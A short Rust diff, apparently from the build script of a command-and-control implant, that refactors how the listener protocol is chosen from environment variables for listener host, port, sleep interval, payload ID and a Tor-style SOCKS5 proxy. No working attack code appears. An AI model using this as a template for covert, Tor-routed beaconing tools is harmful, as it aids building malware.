@@ -24,20 +24,19 @@ fn main() {
     let server_port = env::var("LISTENER_PORT").unwrap_or_default();
     let sleep_interval = env::var("SLEEP_INTERVAL").unwrap_or_else(|_| "60".to_string());
     let payload_id = env::var("PAYLOAD_ID").unwrap_or_default();
+    let protocol = env::var("PROTOCOL").unwrap_or_else(|_| {
+        if server_port == "443" {
+            "https".to_string()
+        } else {
+            "http".to_string()
+        }
+    });
     let socks5_enabled = env::var("SOCKS5_ENABLED")
         .unwrap_or_else(|_| "true".to_string())
         .parse::<bool>()
         .unwrap_or(true);
     let socks5_host = env::var("SOCKS5_HOST").unwrap_or_else(|_| "127.0.0.1".to_string());
     let socks5_port = env::var("SOCKS5_PORT").unwrap_or_else(|_| "9050".to_string());
-    
-    let default_protocol = if server_port == "443" {
-        "https"
-    } else {
-        "http"
-    };
-    
-    let protocol = env::var("PROTOCOL").unwrap_or_else(|_| default_protocol.to_string());
 
     log_build(&format!("LISTENER_HOST: {}", server_host));
     log_build(&format!("LISTENER_PORT: {}", server_port));
